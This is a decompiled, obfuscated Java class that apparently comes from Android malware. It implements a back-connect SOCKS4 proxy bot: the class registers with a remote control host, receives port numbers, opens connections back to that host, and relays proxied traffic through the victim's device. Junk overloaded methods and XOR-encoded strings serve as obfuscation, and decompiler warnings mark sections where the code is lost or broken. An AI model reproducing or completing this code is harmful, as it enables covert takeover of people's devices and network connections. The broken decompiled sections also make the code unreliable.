package beta;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Objects;

/* renamed from: p7c27dba0.p7c27dba0.p5919d155.p80483266 */
public class C0219p80483266 {

    /* renamed from: $ */
    private static short[] f1347$ = {7484, 7485, 7471, 7505};

    /* renamed from: a */
    public Socket f1348a;

    /* renamed from: b */
    public String f1349b;

    /* renamed from: p7c27dba0.p7c27dba0.p5919d155.p80483266$p5919d155 */
    public class RunnableC0220p5919d155 implements Runnable {

        /* renamed from: $ */
        private static short[] f1350$ = {-21922};

        /* renamed from: b */
        public final /* synthetic */ int f1351b;

        /* renamed from: c */
        public final /* synthetic */ C0219p80483266 f1352c;

        /* renamed from: $ */
        private static String m1021$(int i, int i2, int i3) {
            char[] cArr = new char[(i2 - i)];
            for (int i4 = 0; i4 < i2 - i; i4++) {
                cArr[i4] = (char) (f1350$[i + i4] ^ i3);
            }
            return new String(cArr);
        }

        public RunnableC0220p5919d155(C0219p80483266 p80483266, int i) {
            this.f1352c = p80483266;
            this.f1351b = i;
        }

        /* JADX WARNING: Code restructure failed: missing block: B:26:0x00b2, code lost:
            r8 = new java.net.Socket();
         */
        /* JADX WARNING: Code restructure failed: missing block: B:28:?, code lost:
            r8.connect(new java.net.InetSocketAddress(r11, r7));
            r3.setTcpNoDelay(true);
            r3.setSoLinger(false, 0);
            r1 = r8.getInputStream();
            r2 = r8.getOutputStream();
            r6.write(0);
            r6.write(90);
            r6.write(new byte[6]);
            r6.flush();
            r4 = new java.lang.Thread(new p7c27dba0.p7c27dba0.p5919d155.RunnableC0204p023e3d5c(r0, r1, r6));
            r4.start();
            r1 = new java.lang.Thread(new p7c27dba0.p7c27dba0.p5919d155.RunnableC0229pf994e447(r0, r5, r2));
            r1.start();
            r1.join();
            r4.join();
         */
        /* JADX WARNING: Code restructure failed: missing block: B:30:?, code lost:
            r8.close();
         */
        /* JADX WARNING: Code restructure failed: missing block: B:31:0x0102, code lost:
            r0 = th;
         */
        /* JADX WARNING: Code restructure failed: missing block: B:32:0x0103, code lost:
            r2 = r8;
         */
        /* JADX WARNING: Code restructure failed: missing block: B:33:0x0105, code lost:
            r0 = e;
         */
        /* JADX WARNING: Code restructure failed: missing block: B:34:0x0106, code lost:
            r2 = r8;
         */
        /* JADX WARNING: Code restructure failed: missing block: B:62:?, code lost:
            return;
         */
        /* JADX WARNING: Removed duplicated region for block: B:45:0x0119  */
        /* JADX WARNING: Removed duplicated region for block: B:50:0x0124 A[SYNTHETIC, Splitter:B:50:0x0124] */
        /* JADX WARNING: Removed duplicated region for block: B:53:0x0129 A[Catch:{ Exception -> 0x012c }] */
        /* JADX WARNING: Removed duplicated region for block: B:63:? A[RETURN, SYNTHETIC] */
        public void run() {
            Socket socket;
            Throwable th;
            Exception e;
            if ((5 + 10) % 10 <= 0) {
            }
            C0219p80483266 p80483266 = this.f1352c;
            int i = this.f1351b;
            Objects.requireNonNull(p80483266);
            Socket socket2 = null;
            try {
                socket = new Socket();
                try {
                    socket.connect(new InetSocketAddress(p80483266.f1349b, i));
                    socket.setTcpNoDelay(true);
                    socket.setSoLinger(false, 0);
                    InputStream inputStream = socket.getInputStream();
                    OutputStream outputStream = socket.getOutputStream();
                    if (inputStream.read() == 4) {
                        if (inputStream.read() == 1) {
                            byte[] bArr = new byte[2];
                            if (inputStream.read(bArr) != -1) {
                                int i2 = ByteBuffer.wrap(bArr).getShort() & 65535;
                                byte[] bArr2 = new byte[4];
                                if (inputStream.read(bArr2) != -1) {
                                    String str = "";
                                    for (int i3 = 0; i3 < 4; i3++) {
                                        str = str + (bArr2[i3] & 255);
                                        if (i3 != 3) {
                                            str = str + m1021$(0, 1, -21904);
                                        }
                                    }
                                    while (true) {
                                        int read = inputStream.read();
                                        if (read != 0) {
                                            if (read == -1) {
                                                break;
                                            }
                                        } else {
                                            break;
                                        }
                                    }
                                }
                            }
                            socket.close();
                        }
                    }
                    outputStream.write(91);
                } catch (Exception e2) {
                    e = e2;
                    try {
                        e.printStackTrace();
                        if (socket2 != null) {
                            socket2.close();
                        }
                        if (socket == null) {
                            return;
                        }
                        socket.close();
                    } catch (Throwable th2) {
                        th = th2;
                        if (socket2 != null) {
                        }
                        if (socket != null) {
                        }
                        throw th;
                    }
                }
            } catch (Exception e3) {
                e = e3;
                socket = null;
                e.printStackTrace();
                if (socket2 != null) {
                }
                if (socket == null) {
                }
                socket.close();
            } catch (Throwable th3) {
                th = th3;
                socket = null;
                if (socket2 != null) {
                    try {
                        socket2.close();
                    } catch (Exception unused) {
                        throw th;
                    }
                }
                if (socket != null) {
                    socket.close();
                }
                throw th;
            }
            socket.close();
        }
    }

    /* renamed from: $ */
    private static String m1019$(int i, int i2, int i3) {
        char[] cArr = new char[(i2 - i)];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) (f1347$[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public C0219p80483266(String str, int i) {
        try {
            Socket socket = new Socket(str, i);
            this.f1348a = socket;
            socket.setKeepAlive(true);
            this.f1349b = str;
            mo2118a();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream) {
        if ((26 + 16) % 16 <= 0) {
        }
        Objects.requireNonNull(p80483266);
        try {
            byte[] bArr = new byte[512];
            while (true) {
                int read = inputStream.read(bArr);
                if (read != -1) {
                    outputStream.write(bArr, 0, read);
                    outputStream.flush();
                } else {
                    return;
                }
            }
        } catch (Exception unused) {
        }
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, char c, boolean z, String str, int i) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, char c, boolean z, String str, int i, byte b, int i2, short s, String str2) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, char c, boolean z, String str, int i, String str2, byte b, short s, int i2) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, char c, boolean z, String str, int i, String str2, short s, int i2, byte b) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, float f, String str, char c, boolean z) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, char c, int i, boolean z) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, char c, int i, boolean z, byte b, int i2, boolean z2, String str2) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, char c, int i, boolean z, int i2, byte b, boolean z2, String str2) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, char c, int i, boolean z, String str2, boolean z2, int i2, byte b) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, int i, boolean z, char c) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, int i, boolean z, char c, byte b, short s, float f, char c2) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, int i, boolean z, char c, char c2, short s, float f, byte b) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, String str, int i, boolean z, char c, short s, byte b, float f, char c2) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, boolean z, char c, float f, String str) {
        double d = (double) ((42 * 210) + 210);
    }

    public static void m9347a69b(C0219p80483266 p80483266, InputStream inputStream, OutputStream outputStream, boolean z, char c, String str, float f) {
        double d = (double) ((42 * 210) + 210);
    }

    /* renamed from: a */
    public final void mo2118a() {
        if ((11 + 8) % 8 <= 0) {
        }
        try {
            InputStream inputStream = this.f1348a.getInputStream();
            OutputStream outputStream = this.f1348a.getOutputStream();
            outputStream.write(ByteBuffer.allocate(4).putInt(181030).array());
            String str = C0205p07842222.f1312a;
            outputStream.write(ByteBuffer.allocate(4).putInt(str.length()).array());
            outputStream.write(str.getBytes(m1019$(0, 4, 7529)));
            while (true) {
                byte[] bArr = new byte[2];
                if (inputStream.read(bArr) != -1) {
                    int i = ByteBuffer.wrap(bArr).getShort() & 65535;
                    if (i > 0) {
                        new Thread(new RunnableC0220p5919d155(this, i)).start();
                    }
                } else {
                    return;
                }
            }
        } catch (Exception unused) {
        }
    }
}
